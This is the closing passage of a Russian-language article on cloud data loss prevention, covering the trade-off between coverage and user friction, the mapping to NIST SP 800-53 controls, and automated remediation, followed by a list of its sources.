- **Главный компромисс:** Чем больше DLP-покрытие (все каналы, все типы данных), тем выше операционная нагрузка (false positives, user friction, стоимость) и тем выше вероятность, что строгий DLP заставит пользователей искать обходные пути. Баланс: risk-based coverage (максимальный для Restricted данных, базовый для Internal) + user education + acceptable alternatives.
- **Связь с ключевым стандартом:** NIST SP 800-53 AC-4 (Information Flow Enforcement), RA-5 (Vulnerability Scanning), и SI-4 (System Monitoring) — три оси DLP: контроль потоков, обнаружение уязвимостей (exposed data) и непрерывный мониторинг аномалий доступа.
- **Практическое правило:** DLP, который не блокирует автоматически CRITICAL violations — это не защита, а forensic tool. Автоматическая ремедиация (через SOAR) для детерминированных случаев (публичный S3-бакет, ПДн в email) — mandatory, не optional.

---
_Статья создана на основе анализа NIST SP 800-53 (AC, RA, SI Controls), CIS Controls v8 (Control 3 Data Protection), GDPR Art. 32, PCI DSS Req 3-4, официальной документации облачных DLP-сервисов (Amazon Macie, Azure Purview, GCP Sensitive Data Protection), материалов CASB-вендоров (Netskope, Zscaler), открытых инцидентов (Pegasus Airlines 2022, Microsoft 2020), Gartner Market Guide for DLP (2023), и CSA Cloud Controls Matrix v4._
